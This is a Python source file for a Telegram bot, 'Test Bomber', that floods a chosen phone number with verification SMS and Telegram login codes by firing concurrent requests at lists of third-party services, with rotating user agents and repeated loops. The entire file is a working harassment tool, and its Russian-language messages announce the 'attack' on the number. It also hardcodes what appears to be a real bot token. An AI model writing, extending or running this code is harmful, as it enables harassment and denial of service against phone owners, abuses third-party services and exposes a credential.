# yo
# thx for using this
# tg_bomber.py
token = '8369236704:AAGkjZC1zAA-m28Nsu78zllvMZASEbwC3JQ'
bot_name = "Test Bomber"

import asyncio
import aiohttp
import random
import json
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.client.default import DefaultBotProperties
from fake_useragent import UserAgent

from services import sms_services, tg_services

logging.basicConfig(level=logging.INFO)

SMS_COUNT = len(sms_services)
TG_COUNT = len(tg_services)
TOTAL_COUNT = SMS_COUNT + TG_COUNT

bot = Bot(token=token, default=DefaultBotProperties(parse_mode='HTML'))
dp = Dispatcher()
ua = UserAgent()

user_mode = {}

async def req(s, method, url, **kwargs):
    try:
        headers = {'User-Agent': ua.random}
        if "headers" in kwargs:
            headers.update(kwargs.pop("headers"))
        async with s.request(method, url, timeout=12, headers=headers, **kwargs) as r:
            if r.status not in (200, 201, 202, 204):
                logging.info(f"Bad status {r.status} for {url}")
            return r.status in (200, 201, 202, 204)
    except Exception as e:
        logging.error(f"Request failed {url}: {str(e)}")
        return False

async def sms_attack(phone, loops=5):
    clean = phone.lstrip('+')
    full_phone = phone if phone.startswith('+') else f"+{phone}"

    async with aiohttp.ClientSession() as s:
        for i in range(loops):
            tasks = []
            for srv in sms_services:
                url = srv["url"]
                method = srv.get("method", "POST").upper()
                raw_data = srv.get("data") or srv.get("json")
                headers = srv.get("headers", {})
                params = srv.get("params", {})

                json_data = None
                form_data = None

                if isinstance(raw_data, str):
                    try:
                        # Убираем внешние кавычки и парсим JSON-строку
                        cleaned = raw_data.strip("'\"")
                        json_data = json.loads(cleaned)
                        # Замена плейсхолдеров внутри словаря
                        for k in json_data:
                            if isinstance(json_data[k], str):
                                json_data[k] = json_data[k].replace("%phone%", clean)\
                                                           .replace("%full_phone%", full_phone)\
                                                           .replace("%phone5%", f"7{clean}" if len(clean) == 10 else clean)
                    except json.JSONDecodeError:
                        # Если не JSON — отправляем как form-data
                        form_data = raw_data.replace("%phone%", clean)\
                                            .replace("%full_phone%", full_phone)\
                                            .replace("%phone5%", f"7{clean}" if len(clean) == 10 else clean)
                elif isinstance(raw_data, dict):
                    json_data = {
                        k: str(v).replace("%phone%", clean).replace("%full_phone%", full_phone)
                        for k, v in raw_data.items()
                    }

                if json_data:
                    tasks.append(req(s, method, url, json=json_data, headers=headers, params=params))
                elif form_data:
                    tasks.append(req(s, method, url, data=form_data, headers=headers, params=params))
                else:
                    tasks.append(req(s, method, url, headers=headers, params=params))

            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(random.uniform(0.5, 1.5))  # задержка между итерациями

async def tg_attack(phone, loops=5):
    async with aiohttp.ClientSession() as s:
        for _ in range(loops):
            tasks = []
            for srv in tg_services:
                url = srv["url"]
                data_raw = srv.get("data")
                data = data_raw.replace("%phone%", phone) if isinstance(data_raw, str) else data_raw or {"phone": phone}
                tasks.append(req(s, "POST", url, data=data))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.6)

def get_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💬 SMS-Бомбер", callback_data="sms"),
            InlineKeyboardButton(text="🔹 Telegram-Бомбер", callback_data="tg")
        ]
    ])

@dp.message(Command("start"))
async def start(m: types.Message):
    name = m.from_user.first_name or "пользователь"
    text = (
        f"Привет, {name}.\n\n"
        f"<b>{bot_name}</b>\n\n"
        f"Сервисов загружено:\n"
        f"• SMS → <code>{SMS_COUNT}</code>\n"
        f"• Telegram → <code>{TG_COUNT}</code>\n"
        f"• Всего → <code>{TOTAL_COUNT}</code>\n\n"
        "Выбери режим:"
    )
    await m.answer(text, reply_markup=get_kb())

@dp.callback_query(F.data.in_(["sms", "tg"]))
async def ask_phone(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_mode[user_id] = callback.data

    mode_name = "SMS" if callback.data == "sms" else "Telegram"
    text = f"Режим: <b>{mode_name}</b>\n\nВведи номер с кодом страны\nПример: <code>+380671234567</code>"
    await callback.message.answer(text, reply_markup=get_kb())
    await callback.answer()

@dp.message(F.text.regexp(r'^(\+)?\d{9,15}$'))
async def run_bomber(m: types.Message):
    user_id = m.from_user.id
    mode = user_mode.get(user_id, "sms")

    num = m.text.strip()
    if not num.startswith('+'):
        num = '+' + num

    await m.answer(f"Запуск {mode.upper()} на {num}...")

    if mode == "sms":
        await sms_attack(num)
    else:
        await tg_attack(num)

    await m.answer(f"Атака на {num} завершена.", reply_markup=get_kb())

async def main():
    await dp.start_polling(bot)

asyncio.run(main())
